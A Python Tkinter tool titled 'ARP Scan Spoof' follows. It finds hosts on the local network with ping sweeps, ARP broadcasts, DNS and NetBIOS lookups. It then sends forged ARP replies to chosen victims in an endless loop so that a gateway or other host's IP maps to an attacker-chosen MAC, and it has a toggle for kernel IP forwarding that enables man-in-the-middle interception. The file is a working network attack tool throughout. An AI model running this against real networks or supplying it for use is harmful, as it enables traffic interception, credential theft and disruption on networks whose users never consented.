import netifaces
import multiprocessing
import subprocess
from subprocess import PIPE
from tkinter import *
from tkinter.ttk import *
from scapy.all import *
import time

interfaces = {}
gateways_iff = []
gateways = []

def is_number(s):
	try:
		float(s)
		return True
	except:
		return False

def addr2bin(addr):
	binary = ""
	for num in addr.split("."):
		b = str(bin(int(num))).split("b")[1]
		binary += "0"*(8-len(b))+b
	return binary

def bin2addr(bin):
	addr = []
	for n in range(0,32,8):
		addr.append(str(int(bin[n:n+8],2)))
	return ".".join(addr)

def red(ip,mask):
	ip_bin = addr2bin(ip)
	mask_bin = addr2bin(mask)
	red_bin = ""
	for x,y in zip(ip_bin,mask_bin):
		red_bin += "1" if x == y == "1" else "0"
	return bin2addr(red_bin)

def broadcast(red,mask):
	red_bin = addr2bin(red)
	mask_num = addr2bin(mask).count("1")
	broadcast_bin = red_bin[0:mask_num]+"1"*(32-mask_num)
	return bin2addr(broadcast_bin)

def get_hostname(ip,gw,send_end):
	try:
		answer = str(subprocess.check_output(["nslookup",ip,gw]))
		if re.findall("name =(.+)\.",answer):
			name = re.findall("name =(.+)\.",answer)[0].replace(" ","")
			hostname = name
		else:
			hostname = "Unknow"

	except:
		hostname = "None"
	send_end.send(hostname)

def get_netbios(ip,send_end):
	try:
		nmblookup = str(subprocess.check_output(["nmblookup","-A",ip]))
		if re.findall("(.+)<00>",nmblookup):
			
			name_nmb = re.findall("(.+)<00>",nmblookup)[0].replace(" ","").replace("\t","")
			netbios = name_nmb
		else:
			netbios = "Unknow"
	except:
		netbios = "None"
	send_end.send(netbios)

def config_iface(iface):
	global interfaces
	global gateways_iff
	global gateways
	addrs = netifaces.ifaddresses(iface)
	if not iface in interfaces:
		interfaces[iface] = {} 
	if 17 in addrs:
		interfaces[iface]["mac"] = addrs[17][0]["addr"]
	if 2 in addrs:
		interfaces[iface]["ip"] = addrs[2][0]["addr"]
		interfaces[iface]["mask"] = addrs[2][0]["netmask"]
	if iface in gateways_iff:
		interfaces[iface]["gateway"] = [x for x in gateways if x[2] == True and iface == x[1]][0][0]

	if len(interfaces[iface].values()) == 4 and iface != "lo":
		for iff in interfaces:
			ip = interfaces[iface]["ip"]
			mask = interfaces[iface]["mask"]
			interfaces[iface]["red"] = red(ip,mask)
			interfaces[iface]["broadcast"] = broadcast(interfaces[iface]["red"],mask)
		
def init():
	global interfaces
	global gateways_iff
	global gateways
	if 2 in netifaces.gateways():
		gateways = netifaces.gateways()[2]
		gateways_iff = [x[1] for x in gateways if x[2] == True]

		for iff in netifaces.interfaces():
			config_iface(iff)
			
		interfaces = {iff:interfaces[iff] for iff in interfaces 
			if iff != "lo" and len(interfaces[iff].values()) >= 5}
			
		if interfaces:
			app = App()
		else:
			print("No Network configuration")
			return 0
	else:
		print("No gateway")
		return 0
	
class App():
	def __init__(self):

		self.escaneando = False

		self.equipos_escaneo = []
		self.hosts = []
		self.host_s = None
		self.spoofs = []
		self.spoof_s = None
		self.exit = 0
		
		#ROOT

		self.root = Tk()
		self.root.title("ARP Scan Spoof")
		self.frame = Frame(borderwidth=2,relief="groove")
		self.frame.grid(row=0,column=0,columnspan=2,sticky=W+E,padx=5,pady=5)

		self.Iinterfaces = InfoInterfaces(self)

		self.barra_escaneo = Progressbar(self.frame,orient="horizontal",maximum=100)
		self.barra_escaneo.grid(column=0,row=10,columnspan=3,padx=5,pady=10,sticky=W+E)

		self.root.resizable(width=True,height=True)
		self.root.minsize(width=700, height=550)

		self.root.rowconfigure(1, weight=1)
		self.root.rowconfigure(2, weight=1)
		self.root.columnconfigure(0, weight=1)
		
		#FRAME EQUIPOS

		self.frame_equipos = Frame(borderwidth=2,relief="groove",height=50)
		self.frame_equipos.grid(row=1,column=0,sticky=W+E+N+S,padx=5,pady=5)

		columnas_host = ["IP","MAC","NS","NetBIOS"]
		self.treeview_hosts = Treeview(self.frame_equipos,columns=columnas_host,show="headings",height=6)
		for c in columnas_host:
			self.treeview_hosts.heading(c,text=c)
			self.treeview_hosts.column(c,width=150)
			self.treeview_hosts.column(c,minwidth=50)
		self.treeview_hosts.grid(row=0,column=0,sticky=W+E+N+S,padx=5,pady=5)

		self.treeview_hosts.tag_configure("par", background="#F2F2F2")
		self.treeview_hosts.tag_configure("selec", foreground="darkred")

		self.treeview_hosts.bind("<<TreeviewSelect>>",self.select_host)

		scroll_y_fe = Scrollbar(self.frame_equipos,orient=VERTICAL, command=self.treeview_hosts.yview)
		self.treeview_hosts["yscroll"] = scroll_y_fe.set
		scroll_y_fe.grid(row=0,column=1,sticky=N+S)

		scroll_x_fe = Scrollbar(self.frame_equipos,orient=HORIZONTAL, command=self.treeview_hosts.xview)
		self.treeview_hosts["xscroll"] = scroll_x_fe.set
		scroll_x_fe.grid(row=1,column=0,sticky=W+E)

		self.frame_equipos.columnconfigure(0,weight=1)
		self.frame_equipos.rowconfigure(0,weight=1)

		#FRAME BUTTON SPOOF

		self.frame_spoof = Frame(borderwidth=2,relief="groove",width=180,height=50)
		self.frame_spoof.grid(row=1,column=1,sticky=W+E+N+S,padx=5,pady=5)

		self.ip_changed_combobox = Combobox(self.frame_spoof,state="readonly")
		self.mac_new_combobox = Combobox(self.frame_spoof,state="readonly")

		self.ip_changed_combobox["values"] = self.Iinterfaces.gateway
		self.mac_new_combobox["values"] = self.Iinterfaces.mac

		self.ip_changed_combobox.current(0)
		self.mac_new_combobox.current(0)

		self.ip_c_select = self.Iinterfaces.gateway
		self.new_mac_select = self.Iinterfaces.mac

		self.ip_changed_combobox.bind("<<ComboboxSelected>>", self.select_ip_c)
		self.mac_new_combobox.bind("<<ComboboxSelected>>", self.select_mac_new)

		self.button_spoof = Button(self.frame_spoof,state="disabled", text="Spoof",
			command=lambda: self.launch_spoof(self.host_s.ip,self.ip_c_select,self.new_mac_select))

		Label(self.frame_spoof,text="IP Changed:").grid(row=0,column=0,padx=5,pady=5,sticky=W+E)
		Label(self.frame_spoof,text="New MAC:").grid(row=2,column=0,padx=5,pady=5,sticky=W+E)
		self.ip_changed_combobox.grid(row=1,column=0,sticky=W+E,padx=5,pady=5)
		self.mac_new_combobox.grid(row=3,column=0,sticky=W+E,padx=5,pady=5)
		self.button_spoof.grid(row=4,column=0,sticky=W+E,padx=5,pady=10)

		#FRAME HOSTS SPOOFING

		self.frame_hosts_spoofing = Frame(borderwidth=2,relief="groove",height=50)
		self.frame_hosts_spoofing.grid(row=2,column=0,sticky=W+E+N+S,padx=5,pady=5)

		columnas_host_spoofing = ["Victim IP","IP Changed","New MAC","Time Lapse"]
		self.treeview_hosts_spoofing = Treeview(self.frame_hosts_spoofing,
			columns=columnas_host_spoofing,show="headings",height=6)
		for c in columnas_host_spoofing:
			self.treeview_hosts_spoofing.heading(c,text=c)
			self.treeview_hosts_spoofing.column(c,width=150)
			self.treeview_hosts_spoofing.column(c,minwidth=50)
		self.treeview_hosts_spoofing.grid(row=0,column=0,sticky=W+E+N+S,padx=5,pady=5)

		self.treeview_hosts_spoofing.tag_configure("par", background="#F2F2F2")

		self.treeview_hosts_spoofing.bind("<<TreeviewSelect>>",self.select_spoof)

		scroll_y_hs = Scrollbar(self.frame_hosts_spoofing,orient=VERTICAL, command=self.treeview_hosts_spoofing.yview)
		self.treeview_hosts_spoofing["yscroll"] = scroll_y_hs.set
		scroll_y_hs.grid(row=0,column=1,sticky=N+S)

		scroll_x_hs = Scrollbar(self.frame_hosts_spoofing,orient=HORIZONTAL, command=self.treeview_hosts_spoofing.xview)
		self.treeview_hosts_spoofing["xscroll"] = scroll_x_hs.set
		scroll_x_hs.grid(row=1,column=0,sticky=W+E)

		self.frame_hosts_spoofing.columnconfigure(0,weight=1)
		self.frame_hosts_spoofing.rowconfigure(0,weight=1)

		#FRAME CONFIG SPOOFING

		self.frame_config_spoof = Frame(borderwidth=2,relief="groove",width=180,height=50)
		self.frame_config_spoof.grid(row=2,column=1,sticky=W+E+N+S,padx=5,pady=5)

		Label(self.frame_config_spoof,text="Time Lapse:").grid(row=0,column=0,sticky=W+E,padx=5,pady=5)

		self.entry_time_lapse = Entry(self.frame_config_spoof,state="disabled",width=5)
		self.entry_time_lapse.grid(row=1,column=0,sticky=W+E,padx=5,pady=5)

		self.button_time_lapse = Button(self.frame_config_spoof,state="disabled",text="Change",
			command=lambda: self.spoof_s.change_time_lapse(self,self.entry_time_lapse.get()))
		self.button_time_lapse.grid(row=1,column=1,sticky=W,padx=5,pady=5)
		
		self.button_delete_spoof = Button(self.frame_config_spoof,state="disabled",text="Delete",
			command=lambda: self.spoof_s.stop(self))

		self.button_delete_spoof.grid(row=2,column=0,columnspan=2,sticky=W+E,padx=5,pady=10)

		self.time_update()

		self.root.mainloop()

		self.exit = 1

		for spoof in self.spoofs:
			if spoof:
				spoof.stop(self)

	def select_ip_c(self,event):
		self.ip_c_select = self.ip_changed_combobox["values"][self.ip_changed_combobox.current()]
	
	def select_mac_new(self,event):
		self.new_mac_select = self.mac_new_combobox["values"][self.mac_new_combobox.current()]

	def select_spoof(self,event):
		id_s = self.treeview_hosts_spoofing.focus()
		if id_s:
			datos_spoof_s = self.treeview_hosts_spoofing.item(id_s)["values"]
			n_l = int(id_s)
			self.spoof_s = self.spoofs[n_l]
			self.button_delete_spoof.config(state="normal")
			self.entry_time_lapse.config(state="normal")
			self.button_time_lapse.config(state="normal")
			self.entry_time_lapse.delete(0,END)
			self.entry_time_lapse.insert(0,str(self.spoof_s.time_lapse))
	
	def select_host(self,event):
		id_h = self.treeview_hosts.focus()
		if id_h:
			datos_host_s = self.treeview_hosts.item(id_h)["values"]
			n_l = int(id_h)
			self.host_s = self.hosts[n_l]
			self.button_spoof.config(state="normal")

	def onFrameConfigure(self, event):
		canvas_height = self.canvas.winfo_height()
		frame_equipos_height = event.height
		self.canvas.configure(scrollregion=self.canvas.bbox("all"))

	def FrameWidth(self, event):
		canvas_width = event.width-10
		self.canvas.itemconfig(self.canvas_frame, width = canvas_width)

	def show_arp_table(self,arp_scan_list,ping_scan_list):
		lista_hosts = []
		arp_table = str(subprocess.check_output(["arp","-n"]))
		arp_table = str(arp_table).split("\n")
		arp_table = arp_table[1:len(arp_table)]
		for host in arp_table:
			h_list = host.split()
			if len(h_list) == 5 and h_list[4] == self.Iinterfaces.interface_selec:
				lista_hosts.append([h_list[0],h_list[2]])
		for host in arp_scan_list:
			if not host in lista_hosts:
				lista_hosts.append(host)
		for host in ping_scan_list:
			if not host in [ip[0] for ip in lista_hosts]:
				arp_table_host = str(subprocess.check_output(["arp","-n",host]))
				arp_table_host = str(arp_table_host).split("\n")
				if len(arp_table_host) >= 2:
					arp_t = arp_table_host[1].split()
					if len(arp_t) == 5:
						lista_hosts.append([arp_t[0],arp_t[2]]) 
		return lista_hosts

	def ping_hosts(self,red,broadcast):
		lista_procesos = []
		pipe_list = []
		ip_l = red.split(".")
		broadcast_l = broadcast.split(".")
		ip_l[3] = str(int(ip_l[3])+1)
		while ip_l != broadcast_l:
			recv_end, send_end = multiprocessing.Pipe(False)
			p = multiprocessing.Process(target=self.ping_h, args=(".".join(ip_l),send_end))
			lista_procesos.append(p)
			pipe_list.append(recv_end)
			p.start()
			for n in range(4):
				if ip_l[n] == "255":
					for n in range(4)[n:4]:
						ip_l[n] = "0"
					ip_l[n-1] = str(int(ip_l[n-1])+1)
			ip_l[3] = str(int(ip_l[3])+1)
		for proc in lista_procesos:
			proc.join()
		results = [x.recv() for x in pipe_list]
		return [x for x in results if x]

	def ping_h(self,ip,send_end):
		ping = subprocess.Popen(["ping","-c 1",ip],stdout=PIPE,stderr=PIPE,stdin=PIPE)
		ping_read = str(ping.stdout.read())
		if re.findall("(\d) received",ping_read):
			reply = int(re.findall("(\d) received",ping_read)[0])
		else:
			reply = False
		if reply:
			send_end.send(ip)
		else:
			send_end.send(False)

	def launch_spoof(self,ip_v,ip_c,new_mac):
		self.spoofs.append(Spoof(self,ip_v,ip_c,new_mac))

	def escaneo(self):
		if not self.escaneando:
			for host in self.treeview_hosts.get_children():
				self.treeview_hosts.delete(host)
			for spoof in self.treeview_hosts_spoofing.get_children():
				self.treeview_hosts_spoofing.delete(spoof)
			for spoof in self.spoofs:
				spoof.stop()
			self.spoofs = []
			Style().configure("Red.TButton", foreground="darkred")
			self.escaneando = 1
			self.Iinterfaces.escanear.config(style="Red.TButton")
			self.button_spoof.config(state="disabled")
			self.ip_changed_combobox["values"] = self.Iinterfaces.gateway
			self.mac_new_combobox["values"] = self.Iinterfaces.mac
			self.ip_changed_combobox.current(0)
			self.mac_new_combobox.current(0)
			self.equipos_escaneo = []
			self.hosts = []
			self.Iinterfaces.tipo_scan["text"] = "Ping Scan..."
			self.barra_escaneo["value"] = 5

	def time_update(self):
		if self.escaneando:
			if self.escaneando == 1:
				self.ping_host_list = self.ping_hosts(self.Iinterfaces.red,self.Iinterfaces.broadcast)
				self.ping_host_list = [ip for ip in self.ping_host_list
					 if ip not in [self.Iinterfaces.ip,self.Iinterfaces.gateway]]
				self.escaneando += 1
				self.barra_escaneo["value"] = 30
				self.Iinterfaces.tipo_scan["text"] = "ARP Scan..."
			elif self.escaneando == 2:
				pdst_ip = self.Iinterfaces.ip+"/"+self.Iinterfaces.num_mask
				alive,dead=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=pdst_ip),
					timeout=1, verbose=0, iface=self.Iinterfaces.interface_selec)
				hosts_list_scan = []
				for i in range(0,len(alive)):
					ip = alive[i][1].psrc
					mac = alive[i][1].hwsrc
					hosts_list_scan.append([ip,mac])
				self.hosts_list_final = self.show_arp_table(hosts_list_scan,self.ping_host_list)
				self.escaneando += 1
				self.barra_escaneo["value"] = 50
				self.Iinterfaces.tipo_scan["text"] = "Resolving Hostnames..."
			elif self.escaneando == 3:
				self.pipe_list_hostname = []
				self.procesos_gethost = []
				gw = self.Iinterfaces.gateway
				for host in self.hosts_list_final:
					ip = host[0]
					mac = host[1]
					self.equipos_escaneo.append([ip,mac])
					recv_end, send_end = multiprocessing.Pipe(False)
					p_hostname = multiprocessing.Process(target=get_hostname,args=(ip,gw,send_end))
					self.procesos_gethost.append(p_hostname)
					self.pipe_list_hostname.append(recv_end)
					p_hostname.start()
				self.escaneando += 1
				self.barra_escaneo["value"] = 60
			elif self.escaneando == 4:
				self.pipe_list_netbios = []
				self.procesos_getnetbios = []
				gw = self.Iinterfaces.gateway
				for host in self.hosts_list_final:
					ip = host[0]
					mac = host[1]
					recv_end, send_end = multiprocessing.Pipe(False)
					p_netbios = multiprocessing.Process(target=get_netbios,args=(ip,send_end))
					self.procesos_getnetbios.append(p_netbios)
					self.pipe_list_netbios.append(recv_end)
					p_netbios.start()
				self.escaneando += 1
				self.barra_escaneo["value"] = 70
			elif self.escaneando == 5:		
				if self.procesos_gethost:
					p_n = 0
					for proc in self.procesos_gethost:
						self.procesos_gethost[p_n].join()
						p_n += 1
					n_r = 0
					self.hostnames = []
					for equipo in self.equipos_escaneo:
						self.hostnames.append(self.pipe_list_hostname[n_r].recv())
						n_r += 1
				self.escaneando += 1
				self.barra_escaneo["value"] = 80
				self.Iinterfaces.tipo_scan["text"] = "Resolving NetBIOS..."
			elif self.escaneando == 6:		
				if self.procesos_getnetbios:
					p_n = 0
					for proc in self.procesos_getnetbios:
						self.procesos_getnetbios[p_n].join()
						p_n += 1
					n_r = 0
					for equipo in self.equipos_escaneo:
						hostname = self.hostnames[n_r]
						netbios = self.pipe_list_netbios[n_r].recv()
						self.hosts.append(Host(self,equipo[0],equipo[1],hostname,netbios,n_r+1))
						n_r += 1
				self.escaneando += 1
				self.barra_escaneo["value"] = 90
				self.Iinterfaces.tipo_scan["text"] = "Finish"
			elif self.escaneando == 7:
				self.escaneando = False
				self.barra_escaneo["value"] = 0
				Style().configure("Black.TButton", foreground="black")
				self.Iinterfaces.escanear.config(style="Black.TButton")	
				self.Iinterfaces.tipo_scan["text"] = ""
				self.ip_changed_combobox["values"] = ([self.Iinterfaces.gateway]+
					[x[0] for x in self.equipos_escaneo if not x[0] in self.ip_changed_combobox["values"]])
				self.mac_new_combobox["values"] = ([self.Iinterfaces.mac]+
					[x[1] for x in self.equipos_escaneo if not x[1] in self.mac_new_combobox["values"]])
				self.ip_changed_combobox.current(0)
				self.mac_new_combobox.current(0)
		self.root.after(100,self.time_update)

class InfoInterfaces():
	def __init__(self,master):
		interface_label = Label(master.frame,text="Interface:")
		interface_label.grid(column=0,row=0,padx=5,pady=5,sticky=W)

		Style().configure("Blue.TCombobox", foreground="darkblue")
		Style().configure("Green.TEntry", foreground="darkgreen")
		Style().configure("Red.TEntry", foreground="darkred")

		self.combobox = Combobox(master.frame,state="readonly",width=15,style="Blue.TCombobox")
		self.combobox["values"] = [x for x in interfaces]
		self.combobox.grid(column=1,row=0,padx=5,pady=5,sticky=W)
		self.combobox.current(0)
		self.combobox.bind("<<ComboboxSelected>>", self.iface_selec)

		Separator(master.frame,orient=HORIZONTAL).grid(column=0,row=1,columnspan=8,padx=5,pady=5,sticky=W+E+S)

		self.interface_selec = self.combobox["values"][self.combobox.current()]
		self.mac = interfaces[self.interface_selec]["mac"]
		self.ip = interfaces[self.interface_selec]["ip"]
		self.mask = interfaces[self.interface_selec]["mask"]
		self.num_mask = str(addr2bin(self.mask).count("1"))
		self.gateway = interfaces[self.interface_selec]["gateway"]
		self.red = interfaces[self.interface_selec]["red"]
		self.broadcast = interfaces[self.interface_selec]["broadcast"]
		ip_forward = "error"

		try:
			ip_forward = int(open("/proc/sys/net/ipv4/ip_forward", "r").read())
		except:
			ip_forward = "error"


		if ip_forward == 0:
			self.routing_bit = "No"
			self.routing_enabled = False
			self.text_button_routing = "Enabled"
		elif ip_forward == 1:
			self.routing_bit = "Yes"
			self.routing_enabled = True
			self.text_button_routing = "Disable"
		else:
			self.routing_bit = "Error"
			self.routing_enabled = False
			self.text_button_routing = "Enabled"
		
		self.tipo_scan = Label(master.frame,text="")

		self.mac_label =  Entry(master.frame, width=18)
		self.write_entry(self.mac_label,self.mac)

		self.ip_label =  Entry(master.frame, width=18)
		self.write_entry(self.ip_label,self.ip)

		self.mask_label = Entry(master.frame, width=18)
		self.write_entry(self.mask_label,self.mask)

		self.num_mask_label = Entry(master.frame, width=18)
		self.write_entry(self.num_mask_label,self.num_mask)

		self.gateway_label = Entry(master.frame, width=18)
		self.write_entry(self.gateway_label,self.gateway)

		self.red_label = Entry(master.frame, width=18)
		self.write_entry(self.red_label,self.red)

		self.broadcast_label = Entry(master.frame, width=18)
		self.write_entry(self.broadcast_label,self.broadcast)

		self.routing_label = Entry(master.frame,width=8)
		self.write_entry(self.routing_label,self.routing_bit)

		if self.routing_enabled:
			self.routing_label["style"] = "Green.TEntry"
		else:
			self.routing_label["style"] = "Red.TEntry"

		self.button_routing = Button(master.frame,text=self.text_button_routing,command=self.routing_change)

		Label(master.frame,text="MAC:").grid(column=0,row=2,padx=5,pady=5,sticky=W)
		Label(master.frame,text="IP:").grid(column=0,row=3,padx=5,pady=5,sticky=W)
		Label(master.frame,text="NetMask:").grid(column=0,row=4,padx=5,pady=5,sticky=W)
		Separator(master.frame,orient=VERTICAL).grid(column=2,row=2,rowspan=3,padx=5,pady=5,sticky=N+S)

		Label(master.frame,text="Gateway:").grid(column=3,row=2,padx=5,pady=5,sticky=W)
		Label(master.frame,text="Network:").grid(column=3,row=3,padx=5,pady=5,sticky=W)
		Label(master.frame,text="Broadcast:").grid(column=3,row=4,padx=5,pady=5,sticky=W)
		Separator(master.frame,orient=VERTICAL).grid(column=5, row=2, rowspan=3, padx=5, pady=5, sticky=N+S)

		Label(master.frame,text="Routing Enable:").grid(column=6,row=2,padx=5,pady=5,sticky=W)

		self.mac_label.grid(column=1,row=2,padx=5,pady=5,sticky=W)
		self.ip_label.grid(column=1,row=3,padx=5,pady=5,sticky=W)
		self.mask_label.grid(column=1,row=4,padx=5,pady=5,sticky=W)

		self.gateway_label.grid(column=4,row=2,padx=5,pady=5,sticky=W)
		self.red_label.grid(column=4,row=3,padx=5,pady=5,sticky=W)
		self.broadcast_label.grid(column=4,row=4,padx=5,pady=5,sticky=W)
		
		self.routing_label.grid(column=7,row=2,padx=5,pady=5,sticky=W)
		self.button_routing.grid(column=6,row=3,padx=5,pady=5,columnspan=2,sticky=W+E)

		Separator(master.frame,orient=HORIZONTAL).grid(column=0,row=8,columnspan=8,padx=5,pady=5,sticky=W+E+S)

		self.escanear = Button(master.frame,text="Escanear",command=master.escaneo)
		self.escanear.grid(column=0,row=9,padx=5,pady=15,columnspan=3,sticky=W+E)

		self.tipo_scan.grid(column=3,row=10,columnspan=3,padx=5,pady=10,sticky=W)

	def write_entry(self,entry,text):
		entry.config(state="normal")
		entry.delete(0,END)
		entry.insert(0,text)
		entry.config(state="readonly")

	def iface_selec(self,event):
		new_iface = self.combobox["values"][self.combobox.current()]
		config_iface(new_iface)
		if self.interface_selec in netifaces.interfaces():
			info_interface = netifaces.ifaddresses(self.interface_selec)
			if 2 in info_interface and 17 in info_interface:
				self.interface_selec = new_iface
				self.mac = interfaces[new_iface]["mac"]
				self.ip = interfaces[new_iface]["ip"]
				self.mask = interfaces[new_iface]["mask"]
				self.num_mask = str(addr2bin(self.mask).count("1"))
				self.gateway = interfaces[new_iface]["gateway"]
				self.red = interfaces[new_iface]["red"]
				self.broadcast = interfaces[new_iface]["broadcast"]

				self.write_entry(self.mac_label,self.mac)
				self.write_entry(self.ip_label,self.ip)
				self.write_entry(self.mask_label,self.mask)
				self.write_entry(self.num_mask_label,"/"+self.num_mask)
				self.write_entry(self.gateway_label,self.gateway)
				self.write_entry(self.red_label,self.red)
				self.write_entry(self.broadcast_label,self.broadcast)
			else:
				print("Error. Bad interface configuration")
		else:
			print("Error. No interface")

	def routing_change(self):
		if self.routing_bit == "Yes":
			ip_forward_file = open("/proc/sys/net/ipv4/ip_forward", "w")
			ip_forward_file.write("0")
			ip_forward_file.close()
			Style().configure("Red.TEntry", foreground="darkred")
			self.routing_label["style"] = "Red.TEntry"
		elif self.routing_bit == "No" or self.routing_bit == "Error":
			ip_forward_file = open("/proc/sys/net/ipv4/ip_forward", "w")
			ip_forward_file.write("1")
			ip_forward_file.close()
			Style().configure("Green.TEntry", foreground="darkgreen")
			self.routing_label["style"] = "Green.TEntry"
		try:
			ip_forward = int(open("/proc/sys/net/ipv4/ip_forward", "r").read())
		except:
			ip_forward = "error"
		if ip_forward == 0:
			self.routing_bit = "No"
			self.routing_enabled = False
			self.text_button_routing = "Enabled"
		elif ip_forward == 1:
			self.routing_bit = "Yes"
			self.routing_enabled = True
			self.text_button_routing = "Disable"
		else:
			self.routing_bit = "Error"
			self.routing_enabled = False
			self.text_button_routing = "Enabled"
		self.button_routing["text"] = self.text_button_routing
		self.write_entry(self.routing_label,self.routing_bit)

class Host():
	def __init__(self,master,ip,mac,hostname,netbios,n_r):

		Style().configure("Red.TButton", foreground="darkred")
		Style().configure("Black.TButton", foreground="black")
		Style().configure("Red.TEntry", foreground="darkred")
		Style().configure("Black.TEntry", foreground="black")

		self.ip = ip
		self.mac = mac
		self.tagx = []
		if n_r%2 == 0:
			self.tagx.append("par")
		else:
			self.tagx.append("impar")
		master.treeview_hosts.insert("","end",iid=str(len(master.hosts)),
			values=[ip,mac,hostname,netbios],tags=self.tagx)

class Spoof():
	def __init__(self,master,ip_v,ip_c,new_mac):
		self.ip_v = ip_v
		self.ip_c = ip_c
		self.new_mac = new_mac
		self.time_lapse = 1
		self.tagx = []
		if (len(master.spoofs)+1)%2 == 0:
			self.tagx.append("par")
		else:
			self.tagx.append("impar")
		master.treeview_hosts_spoofing.insert("","end",iid=str(len(master.spoofs)),
			values=[self.ip_v,self.ip_c,self.new_mac,self.time_lapse],tags=self.tagx)
		self.proceso = multiprocessing.Process(target=self.func_spoof)
		self.proceso.start()
	
	def change_time_lapse(self,master,time):
		if is_number(time) and float(time) > 0.1:
			self.time_lapse = float(time)
			self.proceso.terminate()
			self.proceso = None
			self.proceso = multiprocessing.Process(target=self.func_spoof)
			self.proceso.start()
			id_s = int(master.treeview_hosts_spoofing.focus())
			spoof_values = master.treeview_hosts_spoofing.item(id_s)["values"]
			master.treeview_hosts_spoofing.item(id_s, text="",values=spoof_values[0:3]+[self.time_lapse])
			

	def func_spoof(self):
		arpfake = ARP()
		arpfake.op = 2
		arpfake.psrc = self.ip_c
		arpfake.pdst = self.ip_v
		arpfake.hwdst = self.new_mac
		arpfake.hwsrc = self.new_mac
		#arpfake.show()
		if True:
			while 1:
				#print(self.ip_v,self.ip_c,self.new_mac,self.time_lapse)
				send(arpfake,verbose=0)
				time.sleep(self.time_lapse)
		else:
			send(arpfake,verbose=0)
			#print(self.ip_v,self.ip_c,self.new_mac,self.time_lapse)
			while 1:
				p=sniff(filter="arp and host "+self.ip_v,count=1)
				if p[0].pdst == self.ip_v and p[0].psrc == self.ip_c:
					print(str(p))
					send(arpfake,verbose=0)
			
				
		

	def stop(self,master):
		self.proceso.terminate()
		self.proceso = None
		if not master.exit:
			id_s = int(master.treeview_hosts_spoofing.focus())
			master.spoofs[id_s] = None
			master.treeview_hosts_spoofing.selection_remove(id_s)
			master.treeview_hosts_spoofing.delete(id_s)
			master.button_delete_spoof.config(state="disabled")
			master.entry_time_lapse.delete(0,END)
			master.entry_time_lapse.config(state="disabled")
			master.button_time_lapse.config(state="disabled")
		
		

if __name__ == "__main__":
    init()
		
